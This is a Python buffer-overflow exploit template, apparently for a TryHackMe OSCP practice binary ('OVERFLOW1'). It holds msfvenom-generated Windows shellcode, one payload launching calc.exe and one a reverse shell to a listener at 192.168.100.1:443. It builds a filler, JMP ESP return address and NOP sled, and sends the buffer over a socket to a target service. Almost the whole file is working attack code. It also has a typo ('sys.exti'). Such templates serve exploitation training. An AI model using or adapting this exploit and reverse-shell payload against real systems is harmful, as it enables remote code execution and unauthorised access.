import socket
import sys

#
# opinfosec
# BoF Template for Overflow1 for TryHackMe oscp.exe
# https://github.com/opsec-infosec/BufferOverflow
#


header = "OVERFLOW1 "


# Bad Chars 0x00, 0x7, 0x2e, 0xa0

# Pop Calculator
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x07\x2e\xa0' -f c -v payload_calc
payload_calc =  (
"\xbe\x72\x46\xb7\xf7\xdb\xda\xd9\x74\x24\xf4\x5f"
"\x31\xc9\xb1\x31\x31\x77\x13\x03\x77\x13\x83\xc7"
"\x76\xa4\x42\x0b\x9e\xaa\xad\xf4\x5e\xcb\x24\x11"
"\x6f\xcb\x53\x51\xdf\xfb\x10\x37\xd3\x70\x74\xac"
"\x60\xf4\x51\xc3\xc1\xb3\x87\xea\xd2\xe8\xf4\x6d"
"\x50\xf3\x28\x4e\x69\x3c\x3d\x8f\xae\x21\xcc\xdd"
"\x67\x2d\x63\xf2\x0c\x7b\xb8\x79\x5e\x6d\xb8\x9e"
"\x16\x8c\xe9\x30\x2d\xd7\x29\xb2\xe2\x63\x60\xac"
"\xe7\x4e\x3a\x47\xd3\x25\xbd\x81\x2a\xc5\x12\xec"
"\x83\x34\x6a\x28\x23\xa7\x19\x40\x50\x5a\x1a\x97"
"\x2b\x80\xaf\x0c\x8b\x43\x17\xe9\x2a\x87\xce\x7a"
"\x20\x6c\x84\x25\x24\x73\x49\x5e\x50\xf8\x6c\xb1"
"\xd1\xba\x4a\x15\xba\x19\xf2\x0c\x66\xcf\x0b\x4e"
"\xc9\xb0\xa9\x04\xe7\xa5\xc3\x46\x6d\x3b\x51\xfd"
"\xc3\x3b\x69\xfe\x73\x54\x58\x75\x1c\x23\x65\x5c"
"\x59\xdb\x2f\xfd\xcb\x74\xf6\x97\x4e\x19\x09\x42"
"\x8c\x24\x8a\x67\x6c\xd3\x92\x0d\x69\x9f\x14\xfd"
"\x03\xb0\xf0\x01\xb0\xb1\xd0\x61\x57\x22\xb8\x4b"
"\xf2\xc2\x5b\x94" )

# Reverse Shell
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.1 LPORT=443 -b '\x00\x07\x2e\xa0' -f c -v payload_shell
payload_shell = (
"\xbd\x4b\x22\x91\xc1\xda\xdb\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x0e\x03\x23\x2c\x73\x34\x4f\xd8\xf1"
"\xb7\xaf\x19\x96\x3e\x4a\x28\x96\x25\x1f\x1b\x26\x2d\x4d\x90"
"\xcd\x63\x65\x23\xa3\xab\x8a\x84\x0e\x8a\xa5\x15\x22\xee\xa4"
"\x95\x39\x23\x06\xa7\xf1\x36\x47\xe0\xec\xbb\x15\xb9\x7b\x69"
"\x89\xce\x36\xb2\x22\x9c\xd7\xb2\xd7\x55\xd9\x93\x46\xed\x80"
"\x33\x69\x22\xb9\x7d\x71\x27\x84\x34\x0a\x93\x72\xc7\xda\xed"
"\x7b\x64\x23\xc2\x89\x74\x64\xe5\x71\x03\x9c\x15\x0f\x14\x5b"
"\x67\xcb\x91\x7f\xcf\x98\x02\x5b\xf1\x4d\xd4\x28\xfd\x3a\x92"
"\x76\xe2\xbd\x77\x0d\x1e\x35\x76\xc1\x96\x0d\x5d\xc5\xf3\xd6"
"\xfc\x5c\x5e\xb8\x01\xbe\x01\x65\xa4\xb5\xac\x72\xd5\x94\xb8"
"\xb7\xd4\x26\x39\xd0\x6f\x55\x0b\x7f\xc4\xf1\x27\x08\xc2\x06"
"\x47\x23\xb2\x98\xb6\xcc\xc3\xb1\x7c\x98\x93\xa9\x55\xa1\x7f"
"\x29\x59\x74\x2f\x79\xf5\x27\x90\x29\xb5\x97\x78\x23\x3a\xc7"
"\x99\x4c\x90\x60\x33\xb7\x73\x4f\x6c\xd3\x82\x27\x6f\x1b\x84"
"\x0c\xe6\xfd\xec\x62\xaf\x56\x99\x1b\xea\x2c\x38\xe3\x20\x49"
"\x7a\x6f\xc7\xae\x35\x98\xa2\xbc\xa2\x68\xf9\x9e\x65\x76\xd7"
"\xb6\xea\xe5\xbc\x46\x64\x16\x6b\x11\x21\xe8\x62\xf7\xdf\x53"
"\xdd\xe5\x1d\x05\x26\xad\xf9\xf6\xa9\x2c\x8f\x43\x8e\x3e\x49"
"\x4b\x8a\x6a\x05\x1a\x44\xc4\xe3\xf4\x26\xbe\xbd\xab\xe0\x56"
"\x3b\x80\x32\x20\x44\xcd\xc4\xcc\xf5\xb8\x90\xf3\x3a\x2d\x15"
"\x8c\x26\xcd\xda\x47\xe3\xfd\x90\xc5\x42\x96\x7c\x9c\xd6\xfb"
"\x7e\x4b\x14\x02\xfd\x79\xe5\xf1\x1d\x08\xe0\xbe\x99\xe1\x98"
"\xaf\x4f\x05\x0e\xcf\x45" )



nop_sled = "\x90" * 16  # NOP Sled
filler = "A" * 1978  # Filler 1978 Bytes + 10 Bytes Header
eip = "\xaf\x11\x50\x62"    #0x625011af  Return Address JMP ESP
extend = "\x90" * (400 - (len(payload_calc) + (len(nop_sled)))

try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.100.2", 1337)) 
    buffer = header + filler + eip + nop_sled + payload_calc + extend
    s.send(buffer.encode("latin-1"))
    s.close()
    
except Exception as ex:
    print ("Error: ", ex)
    sys.exti(1)

sys.exit(0)
